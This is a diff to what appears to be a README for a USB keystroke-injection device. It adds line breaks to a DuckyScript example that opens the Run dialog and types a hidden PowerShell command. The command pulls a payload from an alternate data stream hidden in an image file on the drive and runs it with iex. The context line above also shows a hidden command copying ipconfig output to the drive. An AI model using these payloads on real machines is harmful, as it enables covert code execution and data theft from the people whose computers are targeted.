@@ -23,11 +23,17 @@ powershell -nologo -WindowStyle Hidden -c (ipconfig | Add-Content -Path ((Get-Wm
 
 ## DuckyScript Examples
 DELAY 1000
+<br>
 GUI r
+<br>
 DELAY 1000
+<br>
 STRING powershell -nologo  -WindowStyle Hidden -c (type ((Get-WmiObject Win32_Volume -Filter DriveType='2').Name + 'test.jpg:payload.txt') | iex)
+<br>
 DELAY 1000
+<br>
 ENTER
+<br>
 
 ## Learn More!
 https://www.crowdsupply.com/unit-72784/diabolic-drive/updates/alternate-data-streams-ads-for-covert-payload-delivery-and-data-exfiltration
